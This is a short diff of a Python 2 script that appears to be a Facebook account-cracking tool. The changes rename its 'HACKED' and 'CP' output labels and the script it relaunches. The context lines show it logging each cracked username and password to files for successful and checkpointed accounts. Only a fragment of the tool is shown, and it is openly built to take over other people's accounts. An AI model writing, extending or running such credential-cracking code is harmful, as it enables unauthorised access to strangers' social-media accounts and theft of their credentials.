@@ -470,7 +470,7 @@ def action():
 
             if 'access_token' in q:
 
-                print '\x1b[1;92m[SELIM-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                print '\x1b[1;92m[C.S.U-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
 
                 okb = open('save/successfull.txt', 'a')
 
@@ -482,7 +482,7 @@ def action():
 
             elif 'www.facebook.com' in q['error_msg']:
 
-                print '\x1b[1;91m[SELIM-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
+                print '\x1b[1;91m[C.S.U-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
 
                 cps = open('save/checkpoint.txt', 'a')
 
@@ -516,7 +516,7 @@ def action():
 
     raw_input('\n[Press Enter To Go Back]')
 
-    os.system('python2 SELIM.py')
+    os.system('python2 JOKER.py')
 
  
 
